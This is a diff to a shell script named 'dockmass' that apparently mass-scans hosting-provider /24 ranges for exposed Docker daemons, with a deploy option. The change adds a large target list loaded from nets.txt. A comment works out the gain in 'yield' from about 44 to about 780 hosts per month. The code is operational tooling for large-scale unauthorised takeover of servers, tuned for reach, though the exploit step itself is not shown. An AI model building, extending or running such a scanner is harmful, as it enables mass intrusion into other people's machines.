@@ -63,8 +63,14 @@ mkdir -p "$D"
 
 case "${1:-run}" in
     stat)
+        nf_txt=0
+        for nf in "$SELF_DIR/nets.txt" "$SYSDIR/nets.txt"; do
+            [ -s "$nf" ] && { nf_txt=$(tr -d '\r' < "$nf" | grep -c .); break; }
+        done
         echo "dockmass: swept /24s $(wc -l < "$DONE")  daemons found $(wc -l < "$FOUND")"
-        echo "dockmass: nets: ${E_NETS:-${MASS_NETS:-none-set}}"
+        echo "dockmass: nets in worker.env: $(printf '%s\n' ${E_NETS:-${MASS_NETS:-none-set}} | grep -c .)"
+        echo "dockmass: nets in nets.txt: $nf_txt"
+        echo "dockmass: budget ${BUDGET}s par ${PAR} refresh ${REFRESH}s tls ${TLS2376} deploy ${DEPLOY}"
         exit 0 ;;
     run)
         if [ "$#" -gt 0 ]; then shift; fi ;;
@@ -72,6 +78,19 @@ case "${1:-run}" in
 esac
 
 NETS="${E_NETS:-${MASS_NETS:-5.9 88.198 64.227 45.32 51.75 62.210}}"
+# Volume comes from a large provider-precise list (see netbuild.sh) kept in its
+# own file so worker.env stays readable. Why it matters: a host's yield per day is
+# scan rate x density (~30 addr/s x 1e-5 = ~26 daemons/day) regardless of list
+# length, but a SHORT list makes it finish in ~2 days and idle for the rest of the
+# MASS_REFRESH window - which is the difference between ~44 hosts/month and ~780.
+# CR is stripped because the file may have been written on Windows.
+if [ "${MASS_NETS_FILE:-yes}" = yes ]; then
+    for nf in "$SELF_DIR/nets.txt" "$SYSDIR/nets.txt"; do
+        [ -s "$nf" ] || continue
+        NETS="$NETS $(tr -d '\r' < "$nf" | tr '\n' ' ')"
+        break
+    done
+fi
 if [ "$#" -gt 0 ]; then NETS="$*"; fi
 NOW=$(date +%s)
 
